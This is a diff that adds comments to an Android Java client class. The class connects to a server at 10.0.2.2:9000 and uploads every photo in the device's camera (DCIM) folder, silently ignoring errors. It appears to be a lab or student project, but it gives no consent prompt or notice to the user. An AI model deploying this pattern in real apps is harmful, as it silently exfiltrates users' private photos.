@@ -19,23 +19,33 @@ public class ClientConnection extends Thread {
     public Socket socket;
     private Scanner scanner;
 
+    /**
+     * Creates the client connection
+     */
     public ClientConnection() {
 
 
     }
 
+    /**
+     * Runs the client
+     */
     public void run() {
         try {
+            //creates a socket for the client
             this.socket = new Socket("10.0.2.2", 9000);
             this.scanner = new Scanner(System.in);
             System.out.println("\r\nConnected to Server: " + "10.0.2.2");
+            //transfer images to the server
             startTransfer();
         } catch(Exception e) {
-
         }
-
     }
 
+    /**
+     *
+     * @throws IOException
+     */
     public void start1() throws IOException {
         String input;
         while (true) {
@@ -46,12 +56,19 @@ public class ClientConnection extends Thread {
         }
     }
 
-
+    /**
+     * Gets the pictures to transfer to the server
+     */
     public void startTransfer() {
         getPics();
     }
 
 
+    /**
+     * Send images to the server
+     * @param imgbyte - the image want to send
+     * @param pic - file want to send
+     */
     public void connect(byte[] imgbyte, File pic) {
         try {
             try {
@@ -74,6 +91,11 @@ public class ClientConnection extends Thread {
     }
 
 
+    /**
+     * Convert the image to bytes
+     * @param pic - the picture want to convet
+     * @return - image converted to bytes
+     */
     public byte[] picToByte(File pic) {
         try {
             FileInputStream fis = new FileInputStream(pic);
@@ -85,13 +107,20 @@ public class ClientConnection extends Thread {
         return null;
     }
 
-
+    /**
+     * Gets teh bytes from bitmap
+     * @param bitmap - the bitmap
+     * @return an array of bytes
+     */
     public byte[] getBytesFromBitmap(Bitmap bitmap) {
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
         bitmap.compress(Bitmap.CompressFormat.PNG, 70, stream);
         return stream.toByteArray();
     }
 
+    /**
+     * Gets the pictures from the dcim file
+     */
     public void getPics() {
         // Getting the Camera Folder
         File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
@@ -102,6 +131,7 @@ public class ClientConnection extends Thread {
             if (pics != null) {
                 for (File pic : pics) {
                     byte[] byte_pic = picToByte(pic);
+                    //calls connect with the picture in bytes and the file
                     connect(byte_pic, pic);
 
                 }
